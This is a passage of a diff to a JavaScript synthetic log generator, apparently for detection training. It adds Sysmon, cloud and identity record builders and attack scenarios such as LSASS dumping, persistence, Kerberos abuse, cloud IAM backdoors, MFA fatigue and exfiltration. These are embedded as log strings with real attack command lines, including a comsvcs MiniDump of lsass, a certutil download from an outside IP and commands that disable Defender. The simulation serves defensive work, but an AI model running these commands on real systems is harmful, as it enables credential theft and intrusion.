@@ -81,6 +81,7 @@
   };
 
   // Weighted baseline source selection (firewall & web are chattiest).
+  /** @type {[string, number][]} */
   const SOURCE_WEIGHTS = [
     ['firewall', 34], ['web', 26], ['ssh', 12], ['dns', 14], ['windows', 8], ['vpn', 6],
   ];
@@ -273,6 +274,66 @@
     srcType: 'windows', host: h.name, hostIp: h.ip, facility: FACILITY.local5,
     program: 'Microsoft-Windows-Security-Auditing', severity: sev, eventId: eid, msgid: `EventID${eid}`,
   }, fields || {});
+  // Sysmon record. Per-event-ID fields are pre-rendered into `sysmonFields`
+  // because every Sysmon event ID has a different schema.
+  const sym = (h, sev, eid, type, fields) => Object.assign({
+    srcType: 'sysmon', vendor: 'sysmon', host: h.name, hostIp: h.ip, facility: FACILITY.local7,
+    program: 'Sysmon', pid: rand.int(2000, 3000), severity: sev, eventId: eid, sysmonType: type,
+    processGuid: rand.uuid(), processId: rand.int(1000, 9000), userDomain: `CORP\\${rand.pick(USERS)}`,
+  }, fields || {});
+  // AWS CloudTrail record. The corporate account id is fixed so bursts from one
+  // "tenant" correlate; the rule keys its cooldowns on it.
+  const AWS_ACCOUNT = '210987654321';
+  const aws = (fields) => Object.assign({
+    srcType: 'cloudtrail', vendor: 'cloudtrail', host: 'aws-connector-01', facility: FACILITY.local6,
+    program: 'aws_cloudtrail', severity: 3, region: 'us-east-1', accountId: AWS_ACCOUNT,
+    identityType: 'IAMUser', principalId: `AIDA${rand.hex(17).toUpperCase()}`,
+    eventSource: 'iam.amazonaws.com', eventUuid: rand.uuid(), readOnly: false,
+    userAgent: rand.pick(['aws-cli/2.15.30 Python/3.11.6', 'console.amazonaws.com', 'Boto3/1.34.11']),
+  }, fields || {});
+  // Okta System Log record.
+  const idp = (fields) => Object.assign({
+    srcType: 'okta', vendor: 'okta', host: 'okta-connector-01', facility: FACILITY.local6,
+    program: 'okta_systemlog', severity: 6, oktaSeverity: 'INFO', outcome: 'SUCCESS',
+    actorId: `00u${rand.id()}`, eventUuid: rand.uuid(),
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', clientOs: 'Windows 10', browser: 'CHROME',
+  }, fields || {});
+  // Microsoft Entra ID sign-in record. One tenant id across the app so bursts
+  // from the same "directory" correlate.
+  const ENTRA_TENANT = '8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31';
+  const ent = (fields) => Object.assign({
+    srcType: 'entra', vendor: 'entra', host: 'entra-connector-01', facility: FACILITY.local6,
+    program: 'entra_signin', severity: 4, tenantId: ENTRA_TENANT, eventUuid: rand.uuid(),
+    actorId: rand.uuid(), clientOs: 'Windows 10', browser: 'Edge 126.0.0', errorCode: 0,
+    resultDescription: null, caStatus: 'success', riskLevel: 'none', riskDetail: 'none',
+    riskState: 'none', authRequirement: 'multiFactorAuthentication', clientApp: 'Browser',
+    appName: 'Office 365 Exchange Online', appId: '00000002-0000-0ff1-ce00-000000000000',
+  }, fields || {});
+  // Squid access.log record.
+  const sqd = (fields) => Object.assign({
+    srcType: 'squid', vendor: 'squid', host: 'proxy-01', hostIp: '10.10.0.8',
+    facility: FACILITY.local6, program: 'squid', pid: rand.int(1000, 9000), severity: 4,
+    squidCode: 'TCP_MISS', status: 200, elapsed: rand.int(10, 900), peerStatus: 'DIRECT',
+  }, fields || {});
+  // Kubernetes API-server audit event.
+  const k8s = (fields) => Object.assign({
+    srcType: 'k8saudit', vendor: 'k8saudit', host: 'k8s-apiserver-01', hostIp: '10.20.0.10',
+    facility: FACILITY.local6, program: 'kube-apiserver', severity: 3, eventUuid: rand.uuid(),
+    status: 201, rbacDecision: 'allow', userAgent: 'kubectl/v1.30.2', auditLevel: 'RequestResponse',
+  }, fields || {});
+  // VMware ESXi hostd/vpxa record.
+  const esx = (fields) => Object.assign({
+    srcType: 'esxi', vendor: 'esxi', host: 'esxi-01.corp.local', hostIp: '10.10.4.11',
+    facility: FACILITY.local4, program: 'Hostd', daemon: 'Hostd', esxSub: 'Vimsvc.ha-eventmgr',
+    pid: rand.int(200000, 2999999), opId: rand.hex(8), user: 'root', esxLevel: 'warning', severity: 4,
+  }, fields || {});
+  // Geographies used by the impossible-travel / push-bombing scenarios.
+  const GEO = {
+    sydney:  { city: 'Sydney',  country: 'Australia', lat: -33.86, lon: 151.21, asn: 4764 },
+    moscow:  { city: 'Moscow',  country: 'Russia',    lat: 55.75,  lon: 37.61,  asn: 12389 },
+    lagos:   { city: 'Lagos',   country: 'Nigeria',   lat: 6.52,   lon: 3.37,   asn: 29465 },
+    shenzhen:{ city: 'Shenzhen', country: 'China',    lat: 22.54,  lon: 114.06, asn: 4134 },
+  };
 
   const MORE_ATTACKS = {
     'log4shell': {
@@ -461,6 +522,697 @@
           srcType: 'mail', host: h.name, hostIp: h.ip, facility: FACILITY.mail, program: 'postfix', severity: 4, srcIp: a, phish: true, threatSev: 'medium',
           message: `suspicious message from <${sender}> spf=fail dkim=fail dmarc=fail attachment="${att}" to=jdoe@corp.local subject="Urgent: Payment Required"`,
         }];
+      },
+    },
+
+    // ---- Endpoint (Sysmon / Windows) ----------------------------------------
+    'lsass-dump': {
+      label: 'LSASS Credential Dump', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), src = rand.internalIp(), u = rand.pick(USERS);
+        const dmp = 'C:\\Windows\\Temp\\lsass.dmp';
+        // comsvcs.dll MiniDump is the signed-binary route to an LSASS dump — no
+        // attacker tooling on disk, so the Sysmon 10 handle request is the signal.
+        return [
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\rundll32.exe', srcIp: src, userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 ${dmp} full"`,
+              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"',
+              `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
+            message: `Process Create: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 ${dmp} full`,
+          }),
+          sym(h, 2, 10, 'Process accessed', {
+            image: 'C:\\Windows\\System32\\rundll32.exe', srcIp: src, userDomain: `CORP\\${u}`,
+            sysmonFields: ['SourceImage="C:\\Windows\\System32\\rundll32.exe"',
+              'TargetImage="C:\\Windows\\System32\\lsass.exe"', 'GrantedAccess="0x1410"',
+              'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C|comsvcs.dll+6B4E"'],
+            message: 'Process accessed: rundll32.exe -> C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1410',
+          }),
+        ];
+      },
+    },
+    'sched-task-persist': {
+      label: 'Scheduled Task Persistence', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const tn = rand.pick(['\\Microsoft\\Windows\\UpdateOrchestrator\\SysHealth', '\\CorpTelemetrySync']);
+        const cmd = `schtasks.exe /create /tn "${tn}" /tr "C:\\ProgramData\\CorpTelemetry\\telemetry.exe" /sc minute /mo 10 /ru SYSTEM /f`;
+        return [
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\schtasks.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
+            message: `Process Create: ${cmd}`,
+          }),
+          win(h, 4, 4698, { user: u,
+            message: `EventID=4698 A scheduled task was created. TaskName=${tn} Author=CORP\\${u} Command=C:\\ProgramData\\CorpTelemetry\\telemetry.exe Trigger=every 10 minutes RunAs=SYSTEM` }),
+        ];
+      },
+    },
+    'runkey-persist': {
+      label: 'Run-Key Persistence', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const key = 'HKU\\S-1-5-21-1004336348-1177238915-682003330-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync';
+        const val = 'C:\\Users\\Public\\Libraries\\onedrivesync.exe -silent';
+        return [
+          sym(h, 5, 11, 'File created', {
+            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['TargetFilename="C:\\Users\\Public\\Libraries\\onedrivesync.exe"'],
+            message: 'File created: C:\\Users\\Public\\Libraries\\onedrivesync.exe',
+          }),
+          sym(h, 4, 13, 'Registry value set', {
+            image: 'C:\\Windows\\System32\\reg.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`TargetObject="${key}"`, `Details="${val}"`],
+            message: `Registry value set: ${key} = ${val}`,
+          }),
+        ];
+      },
+    },
+    'lolbin-download': {
+      label: 'LOLBin Download (certutil)', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS), dst = rand.ip();
+        const cmd = `certutil.exe -urlcache -split -f http://${dst}/update/payload.txt C:\\Users\\Public\\a.txt`;
+        return [
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
+            message: `Process Create: ${cmd}`,
+          }),
+          sym(h, 5, 3, 'Network connect', {
+            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
+            srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 80,
+            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
+              'DestinationPort=80', 'Initiated="true"'],
+            message: `Network connect: certutil.exe ${h.ip} -> ${dst}:80`,
+          }),
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['CommandLine="certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe"',
+              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
+            message: 'Process Create: certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe',
+          }),
+        ];
+      },
+    },
+    'defender-disabled': {
+      label: 'Defender Disabled', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(['Administrator', 'svc_deploy']);
+        const cmd = 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true';
+        return [
+          sym(h, 3, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
+            message: `Process Create: ${cmd}`,
+          }),
+          win(h, 3, 4688, { user: u,
+            message: 'EventID=4688 A new process has been created. Process=powershell.exe CommandLine="Add-MpPreference -ExclusionPath C:\\ProgramData"' }),
+        ];
+      },
+    },
+    'bloodhound': {
+      label: 'BloodHound AD Recon', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS), src = rand.internalIp(), evs = [];
+        evs.push(sym(h, 4, 1, 'Process Create', {
+          image: 'C:\\Users\\Public\\SharpHound.exe', userDomain: `CORP\\${u}`, srcIp: src,
+          sysmonFields: ['CommandLine="SharpHound.exe --CollectionMethods All --Domain corp.local --ZipFileName corp.zip"',
+            'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
+          message: 'Process Create: SharpHound.exe --CollectionMethods All --Domain corp.local',
+        }));
+        // The collector then walks the directory — a burst of object reads no
+        // ordinary workstation ever produces.
+        const objs = ['user', 'group', 'computer', 'organizationalUnit', 'groupPolicyContainer', 'trustedDomain'];
+        for (let i = 0, n = rand.int(11, 15); i < n; i++) {
+          evs.push(win(h, 5, 4662, { user: u, srcIp: src,
+            message: `EventID=4662 An operation was performed on a Directory Service Object. ObjectType=${rand.pick(objs)} AccessMask=0x100 Account=${u} Properties=Read Property` }));
+        }
+        return evs;
+      },
+    },
+    'psexec-lateral': {
+      label: 'PsExec Lateral Movement', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), src = rand.internalIp(), u = rand.pick(['Administrator', 'svc_admin']);
+        return [
+          win(h, 5, 4624, { user: u, srcIp: src,
+            message: `EventID=4624 An account was successfully logged on. Account=${u} LogonType=3 LogonProcess=NtLmSsp AuthenticationPackage=NTLM Source=${src}` }),
+          win(h, 5, 5140, { user: u, srcIp: src,
+            message: `EventID=5140 A network share object was accessed. ShareName=\\\\*\\ADMIN$ Account=${u} Source=${src}` }),
+          win(h, 3, 7045, { user: u, srcIp: src, program: 'Service Control Manager',
+            message: 'EventID=7045 A service was installed in the system. ServiceName=PSEXESVC ServiceFileName=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service StartType=demand start Account=LocalSystem' }),
+        ];
+      },
+    },
+    'golden-ticket': {
+      label: 'Golden Ticket', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
+        const src = rand.internalIp();
+        // A forged TGT is minted offline from the krbtgt hash, so the DC never
+        // filled in the domain field — a blank "Account Domain: -" on 4769 is the
+        // classic artefact, alongside a lifetime far past policy.
+        return [win(h, 3, 4769, { user: 'FAKE_ADMIN', srcIp: src,
+          message: `EventID=4769 A Kerberos service ticket was requested. Account Name: FAKE_ADMIN Account Domain: - ServiceName=krbtgt TicketEncryptionType=0x12 (AES256) TicketOptions=0x40810000 Client=${src}` })];
+      },
+    },
+    'asrep-roast': {
+      label: 'AS-REP Roasting', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
+        const src = rand.internalIp();
+        // Accounts flagged "do not require Kerberos preauthentication" hand an
+        // AS-REP to anyone who asks — crackable offline, no failed logon logged.
+        return ['svc_legacy', 'svc_scan', 'helpdesk', 'kiosk'].slice(0, rand.int(3, 4)).map((u) =>
+          win(h, 4, 4768, { user: u, srcIp: src,
+            message: `EventID=4768 A Kerberos authentication ticket (TGT) was requested. Account Name: ${u} Pre-Authentication Type: 0 TicketEncryptionType=0x17 (RC4-HMAC) Result Code: 0x0 Client=${src}` }));
+      },
+    },
+
+    // ---- Cloud control plane (AWS CloudTrail) --------------------------------
+    'cloud-logging-disabled': {
+      label: 'Cloud Logging Disabled', category: 'attack',
+      build() {
+        const u = rand.pick(['svc_deploy', 'ci-runner', 'jdoe']), a = rand.pick(THREAT_INTEL.ips);
+        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
+        const trail = `arn:aws:cloudtrail:us-east-1:${AWS_ACCOUNT}:trail/org-audit-trail`;
+        return [
+          aws({ user: u, arn, srcIp: a, eventSource: 'cloudtrail.amazonaws.com', eventName: 'StopLogging',
+            requestParameters: { name: trail },
+            message: `StopLogging on org-audit-trail by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventSource: 'cloudtrail.amazonaws.com', eventName: 'DeleteTrail',
+            requestParameters: { name: trail },
+            message: `DeleteTrail org-audit-trail by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventSource: 'guardduty.amazonaws.com', eventName: 'DeleteDetector',
+            requestParameters: { detectorId: rand.hex(32) },
+            message: `DeleteDetector (GuardDuty) by ${u} from ${a}` }),
+        ];
+      },
+    },
+    'cloud-iam-backdoor': {
+      label: 'Cloud IAM Backdoor', category: 'attack',
+      build() {
+        const u = rand.pick(['svc_deploy', 'ci-runner']), a = rand.pick(THREAT_INTEL.ips);
+        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
+        const victim = `svc_${rand.id().slice(0, 5)}`;
+        return [
+          aws({ user: u, arn, srcIp: a, eventName: 'CreateUser', requestParameters: { userName: victim },
+            message: `CreateUser ${victim} by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventName: 'CreateAccessKey', requestParameters: { userName: victim },
+            responseElements: { accessKey: { accessKeyId: `AKIA${rand.hex(16).toUpperCase()}`, userName: victim, status: 'Active' } },
+            message: `CreateAccessKey for ${victim} by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventName: 'CreateLoginProfile',
+            requestParameters: { userName: victim, passwordResetRequired: false },
+            message: `CreateLoginProfile for ${victim} by ${u} from ${a}` }),
+        ];
+      },
+    },
+    'cloud-privesc': {
+      label: 'Cloud Privilege Escalation', category: 'attack',
+      build() {
+        const u = rand.pick(['svc_deploy', 'ci-runner']), a = rand.pick(THREAT_INTEL.ips);
+        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
+        return [
+          aws({ user: u, arn, srcIp: a, eventName: 'AttachUserPolicy',
+            requestParameters: { userName: u, policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' },
+            message: `AttachUserPolicy AdministratorAccess to ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventName: 'PutUserPolicy',
+            requestParameters: { userName: u, policyName: 'inline-all',
+              policyDocument: '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' },
+            message: `PutUserPolicy inline-all (Action *) for ${u} from ${a}` }),
+        ];
+      },
+    },
+    's3-exposure': {
+      label: 'S3 Bucket Exposed', category: 'attack',
+      build() {
+        const u = rand.pick(['svc_deploy', 'jdoe']), a = rand.pick(THREAT_INTEL.ips);
+        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
+        const bucket = rand.pick(['corp-finance-reports', 'corp-hr-exports', 'corp-db-backups']);
+        return [
+          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutPublicAccessBlock',
+            requestParameters: { bucketName: bucket,
+              PublicAccessBlockConfiguration: { BlockPublicAcls: false, IgnorePublicAcls: false, RestrictPublicBuckets: false } },
+            message: `PutPublicAccessBlock disabled on ${bucket} by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutBucketAcl',
+            requestParameters: { bucketName: bucket, 'x-amz-acl': 'public-read',
+              AccessControlPolicy: { Grantee: 'http://acs.amazonaws.com/groups/global/AllUsers', Permission: 'READ' } },
+            message: `PutBucketAcl public-read (AllUsers) on ${bucket} by ${u} from ${a}` }),
+          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutBucketPolicy',
+            requestParameters: { bucketName: bucket,
+              bucketPolicy: '{"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}' },
+            message: `PutBucketPolicy Principal * on ${bucket} by ${u} from ${a}` }),
+        ];
+      },
+    },
+
+    // ---- Identity provider (Okta) --------------------------------------------
+    'impossible-travel': {
+      label: 'Impossible Travel', category: 'attack',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
+        const name = who.split('@')[0];
+        const far = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
+        // Two successful sign-ins, minutes apart, from cities no aircraft covers
+        // in the gap. Both succeed — only the geography gives it away.
+        return [
+          Object.assign(idp({ user: who, displayName: name, oktaEventType: 'user.session.start',
+            displayMessage: 'User login to Okta', srcIp: rand.ip(),
+            message: `user.session.start SUCCESS ${who} from ${GEO.sydney.city}/${GEO.sydney.country}` }), GEO.sydney),
+          Object.assign(idp({ user: who, displayName: name, severity: 4, oktaSeverity: 'WARN',
+            oktaEventType: 'user.session.start', displayMessage: 'User login to Okta',
+            srcIp: rand.pick(THREAT_INTEL.ips), isProxy: true,
+            message: `user.session.start SUCCESS ${who} from ${far.city}/${far.country}` }), far),
+        ];
+      },
+    },
+    'mfa-fatigue': {
+      label: 'MFA Fatigue (Push Bombing)', category: 'attack',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
+        const geo = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
+        const a = rand.pick(THREAT_INTEL.ips), evs = [];
+        const push = (extra) => Object.assign(idp(Object.assign({
+          user: who, displayName: who.split('@')[0], srcIp: a, isProxy: true, factor: 'push',
+          credType: 'OTP', oktaEventType: 'user.authentication.auth_via_mfa',
+          displayMessage: 'Authentication of user via MFA',
+        }, extra)), geo);
+        for (let i = 0, n = rand.int(8, 12); i < n; i++) {
+          evs.push(push({ severity: 4, oktaSeverity: 'WARN', outcome: 'FAILURE',
+            outcomeReason: 'FAILED_PUSH_VERIFY_REJECTED',
+            message: `user.authentication.auth_via_mfa FAILURE push rejected ${who} from ${geo.city}/${geo.country}` }));
+        }
+        // The user eventually taps Approve just to stop the prompts.
+        evs.push(push({ severity: 2, oktaSeverity: 'WARN', outcome: 'SUCCESS',
+          message: `user.authentication.auth_via_mfa SUCCESS push accepted ${who} from ${geo.city}/${geo.country}` }));
+        return evs;
+      },
+    },
+
+    // ---- Evasion & stealth ----------------------------------------------------
+    // The Picus Red Report 2026 puts 80% of the top-ten techniques in evasion and
+    // persistence rather than destruction; these five cover the ones the app was
+    // missing from that list.
+    'process-injection': {
+      label: 'Process Injection', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const src = 'C:\\Users\\Public\\updater.exe', tgt = 'C:\\Windows\\System32\\svchost.exe';
+        return [
+          sym(h, 3, 8, 'CreateRemoteThread detected', {
+            image: src, userDomain: `CORP\\${u}`,
+            sysmonFields: [`SourceImage="${src}"`, `TargetImage="${tgt}"`,
+              `NewThreadId=${rand.int(4000, 9000)}`, 'StartFunction="LoadLibraryA"',
+              `StartAddress="0x00007FF9${rand.hex(8).toUpperCase()}"`,
+              'StartModule="C:\\Windows\\System32\\kernel32.dll"'],
+            message: `CreateRemoteThread detected: ${src} -> ${tgt} StartFunction=LoadLibraryA`,
+          }),
+          sym(h, 3, 10, 'Process accessed', {
+            image: src, userDomain: `CORP\\${u}`,
+            sysmonFields: [`SourceImage="${src}"`, `TargetImage="${tgt}"`, 'GrantedAccess="0x1F3FFF"',
+              'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|kernelbase.dll+2A1C"'],
+            message: `Process accessed: ${src} -> ${tgt} GrantedAccess=0x1F3FFF (PROCESS_ALL_ACCESS)`,
+          }),
+        ];
+      },
+    },
+    'browser-cred-theft': {
+      label: 'Browser Credential Theft', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const thief = 'C:\\Users\\Public\\sync.exe';
+        // Chrome's saved passwords live in an SQLite DB; the key that decrypts
+        // them is in Local State. Reading both is the whole attack.
+        return [
+          sym(h, 3, 11, 'File created', {
+            image: thief, userDomain: `CORP\\${u}`,
+            sysmonFields: [`TargetFilename="C:\\Users\\${u}\\AppData\\Local\\Temp\\Login Data.tmp"`],
+            message: `File created: copy of "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" by ${thief}`,
+          }),
+          sym(h, 3, 11, 'File created', {
+            image: thief, userDomain: `CORP\\${u}`,
+            sysmonFields: [`TargetFilename="C:\\Users\\${u}\\AppData\\Local\\Temp\\Local State.tmp"`],
+            message: `File created: copy of "AppData\\Local\\Google\\Chrome\\User Data\\Local State" (DPAPI master key) by ${thief}`,
+          }),
+        ];
+      },
+    },
+    'masquerading': {
+      label: 'Masquerading (fake svchost)', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const fake = rand.pick([
+          ['svchost.exe', 'C:\\Users\\Public\\svchost.exe'],
+          ['lsass.exe', 'C:\\ProgramData\\lsass.exe'],
+          ['csrss.exe', 'C:\\Users\\Public\\Downloads\\csrss.exe'],
+        ]);
+        // A real svchost.exe only ever runs from System32 and only ever as a child
+        // of services.exe. Both are wrong here.
+        return [sym(h, 3, 1, 'Process Create', {
+          image: fake[1], userDomain: `CORP\\${u}`,
+          sysmonFields: [`CommandLine="${fake[1]} -k netsvcs"`,
+            'ParentImage="C:\\Users\\Public\\installer.exe"', 'IntegrityLevel="Medium"',
+            `OriginalFileName="${rand.id()}.exe"`, `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
+          message: `Process Create: ${fake[0]} running from ${fake[1]} (not System32), parent=installer.exe`,
+        })];
+      },
+    },
+    'remote-access-tool': {
+      label: 'Remote Access Tool Install', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const rat = rand.pick([
+          ['ScreenConnect.ClientService.exe', 'instance-x7z2q1.screenconnect.com'],
+          ['AnyDesk.exe', 'boot-01.net.anydesk.com'],
+          ['TeamViewer_Service.exe', 'router12.teamviewer.com'],
+        ]);
+        const dst = rand.ip();
+        // Legitimate software, installed by someone who should not be installing
+        // it — the fastest-growing initial-access route into a network.
+        return [
+          sym(h, 4, 1, 'Process Create', {
+            image: `C:\\Users\\${u}\\AppData\\Local\\Temp\\${rat[0]}`, userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="${rat[0]} /silent /install"`,
+              'ParentImage="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"',
+              'IntegrityLevel="High"'],
+            message: `Process Create: remote access tool ${rat[0]} /silent /install from AppData\\Local\\Temp`,
+          }),
+          sym(h, 4, 3, 'Network connect', {
+            image: `C:\\Users\\${u}\\AppData\\Local\\Temp\\${rat[0]}`, userDomain: `CORP\\${u}`,
+            srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 443,
+            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
+              `DestinationHostname="${rat[1]}"`, 'DestinationPort=443', 'Initiated="true"'],
+            message: `Network connect: ${rat[0]} -> ${rat[1]}:443 (unmanaged remote access session)`,
+          }),
+        ];
+      },
+    },
+    'sandbox-evasion': {
+      label: 'Sandbox / VM Evasion', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const dropper = 'C:\\Users\\Public\\invoice.exe';
+        // Malware fingerprints the host before unpacking: if it looks like an
+        // analysis VM it exits clean. The checks themselves are the detection.
+        return [
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['CommandLine="wmic.exe path win32_computersystem get model,manufacturer"',
+              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
+            message: 'Process Create: wmic.exe path win32_computersystem get model,manufacturer (VM artefact check)',
+          }),
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\reg.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['CommandLine="reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions"',
+              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
+            message: 'Process Create: reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions (VM artefact check)',
+          }),
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['CommandLine="cmd.exe /c ping -n 120 127.0.0.1 > nul"',
+              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
+            message: 'Process Create: cmd.exe /c ping -n 120 127.0.0.1 (sleep to outlast the sandbox)',
+          }),
+        ];
+      },
+    },
+
+    // ---- Covert channels & exfiltration --------------------------------------
+    'tor-egress': {
+      label: 'Tor Egress', category: 'attack',
+      build() {
+        const src = rand.internalIp(), u = rand.pick(USERS), evs = [];
+        for (let i = 0, n = rand.int(4, 6); i < n; i++) {
+          const guard = `${rand.int(1, 223)}.${rand.int(0, 255)}.${rand.int(0, 255)}.${rand.int(1, 254)}`;
+          evs.push(sqd({
+            srcIp: src, user: u, method: 'CONNECT', url: `${guard}:${rand.pick([9001, 9030, 9051])}`,
+            squidCode: 'TCP_TUNNEL', bytes: rand.int(80000, 1400000), elapsed: rand.int(60000, 400000),
+            peerHost: guard, contentType: '-', torExit: true,
+            message: `TCP_TUNNEL/200 CONNECT ${guard}:9001`,
+          }));
+        }
+        return evs;
+      },
+    },
+    'saas-c2': {
+      label: 'C2 over Trusted SaaS', category: 'attack',
+      build() {
+        const src = rand.internalIp(), u = rand.pick(USERS), evs = [];
+        // Red Report 2026: crews now route C2 through high-reputation services so
+        // the destination reputation check passes. The *cadence* is the tell.
+        const svc = rand.pick([
+          ['api.openai.com', '/v1/chat/completions'],
+          ['api.telegram.org', `/bot${rand.hex(10)}/sendMessage`],
+          ['raw.githubusercontent.com', `/${rand.id()}/config/main/task.txt`],
+          ['discord.com', `/api/webhooks/${rand.int(1e17, 9e17)}/${rand.hex(24)}`],
+        ]);
+        for (let i = 0, n = rand.int(6, 8); i < n; i++) {
+          evs.push(sqd({
+            srcIp: src, user: u, method: rand.chance(0.5) ? 'POST' : 'GET',
+            url: `https://${svc[0]}${svc[1]}`, squidCode: 'TCP_MISS', status: 200,
+            bytes: 512 + rand.int(0, 24), elapsed: rand.int(120, 260),
+            peerHost: svc[0], contentType: 'application/json', beaconTo: svc[0],
+            message: `TCP_MISS/200 POST https://${svc[0]}${svc[1]}`,
+          }));
+        }
+        return evs;
+      },
+    },
+    'cloud-exfil': {
+      label: 'Exfil to Cloud Storage', category: 'attack',
+      build() {
+        const src = rand.internalIp(), u = rand.pick(USERS);
+        const svc = rand.pick(['mega.nz', 'anonfiles.com', 'transfer.sh', 'dropbox.com']);
+        const mb = rand.int(900, 3200);
+        // One PUT carrying more than the host normally sends in a month, to a
+        // consumer file-drop the business does not use.
+        return [sqd({
+          srcIp: src, user: u, method: 'PUT', url: `https://${svc}/upload/${rand.id()}`,
